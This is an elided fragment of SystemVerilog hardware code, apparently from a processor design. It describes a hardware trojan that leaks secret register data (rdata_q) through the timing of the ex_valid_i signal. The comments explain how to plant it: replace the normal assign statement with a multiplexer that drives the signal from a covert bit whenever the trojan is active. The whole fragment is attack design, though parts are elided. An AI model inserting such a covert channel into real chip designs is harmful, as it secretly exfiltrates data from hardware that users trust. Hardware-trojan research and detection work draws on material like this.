 ...
 * Payload: Modulate ex_valid_i timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of ex_valid_i:
...
logic       covert_bit_out;         // Drives ex_valid_i when trojan active
...
//   Find the assign for ex_valid_i (or rd_error_o as fallback):
//     assign ex_valid_i = <normal_expr>;
//   Replace with:
//     assign ex_valid_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
